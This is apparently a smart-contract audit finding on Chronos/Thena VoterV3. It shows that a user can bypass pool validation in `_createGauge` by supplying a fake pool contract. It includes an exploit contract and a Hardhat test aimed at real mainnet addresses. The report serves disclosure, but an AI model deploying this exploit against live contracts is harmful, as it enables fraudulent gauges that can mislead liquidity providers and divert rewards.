## Impact
According to `Chronos` & `Thena` approach, `Gauge` creation is public, any user has the right to create a `Gauge` for pools and tokens that are allowed.

For example, gauge type 0 - UniV2 pairs. type 1 - some specific CL solutions such as `IchiVault` or `DysonVault` 

In this case, the authorized address (governance) has the ability to create `Gauge` for any type of pool

The bug is that a user can bypass the pool validation checks by providing a malicious contract with fake parameters used in the checks. 

This allows the user ***to create a Gauge with a malicious pool address*** that is not a pool of any of the allowed factories. To be sure, the maliciousness depends on the validations and functionality of the FE, how it pulls up these pools, what information it provides, whether it will allow users to add LPs to these pools, etc.

**Chronos does not have any tokens that are whitelisted, which does not allow ordinary users to build any gauges** (Should recheck)

## Proof of Concept
The user can provide the address under `_pool` of his own malicious contract, and also `gaugeType = 1`
```js
528:    function _createGauge(address _pool, uint256 _gaugeType) internal returns (address _gauge, address _internal_bribe, address _external_bribe) {
        require(_gaugeType < _factories.length, "gaugetype");
        require(gauges[_pool] == address(0x0), "!exists");
        require(_pool.code.length > 0, "!contract");
        ...
        bool isPair;
        address _factory = _factories[_gaugeType];
        address _gaugeFactory = _gaugeFactories[_gaugeType];

        ...
        address tokenA = address(0);
        address tokenB = address(0);
        (tokenA) = IPairInfo(_pool).token0(); // @audit - the malicious contract returns a corrupted token0
        (tokenB) = IPairInfo(_pool).token1();// @audit - malicious contract returns a corrupted token1

        // for future implementation add isPair() in factory
        if(_gaugeType == 0){
            isPair = IPairFactory(_factory).isPair(_pool);
        } 
        if(_gaugeType == 1) { // @audit by specifying type 1, the user is taken to the checks for compliance of the pool with the expected one for type 1 (CL)
            address _clPool = IPairInfo(_pool).pool(); // @audit malicious contract returns a fake pool address
            address _pool_factory = IPairInfo(_clPool).factory(); // @audit the malicious front pool also returns the expected factory to pass verification
            require(_pool_factory == _factory, 'wrong tokens');    
555:        isPair = true;
            clPools.push(_pool);

        } else {
            isPair = false;
        }

        // gov can create for any pool, even non-Chronos pairs
        if (!(governance == msg.sender)) { 
            require(isPair, "!_pool"); // @audit is true because L:555 indicates that this is indeed the expected pair
            require(isWhitelisted[tokenA] && isWhitelisted[tokenB], "!whitelisted"); // @audit passes because the malicious contract provides whitelisted token addresses
            require(tokenA != address(0) && tokenB != address(0), "!pair.tokens");
        }
        ...
    }
```
The test was conducted for Thena since they already have validated tokens, which allows them to pass all the checks,
* The address of the user from whom everything is done is a random address where there is a balance for deploying contracts and executing the code


Example malicious pool:
```js
contract Attack {
    address public token0;
    address public token1;
    address public pool;
    string public symbol = "Error";

    function set(address t0_, address t1_, address pool_) external {
        token0 = t0_;
        token1 = t1_;
        pool = pool_;
    }
}

```

Test:
```js
    const address = "0x04001c5359ec93b3368af1c8f0d5510506ece41b"; // @audit random user address who have BNB balance
    const impersonatedSigner = await ethers.getImpersonatedSigner(address);

    let Attack = await ethers.getContractFactory("Attack");

    let VoterV3 = await ethers.getContractFactory("VoterV3");

    let voter = VoterV3.attach("0x3A1D0952809F4948d15EBCe8d345962A282C4fCb"); // @audit actual Voter Thena contract

    let attack = await Attack.connect(impersonatedSigner).deploy();

    await attack.connect(impersonatedSigner).set(
      "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", // @audit whitelisted USDC token
      "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56", // @audit whitelisted BUSDC token
      "0x49696667dAc8b3d331B55df27da5F1DB36B94189" // @audit right pool with right factory
    );

    let result = await voter
      .connect(impersonatedSigner)
      .createGauge(attack.address, 1);
    console.log("result", result);

    console.log("Created gauge:", await voter.gauges(attack.address));
```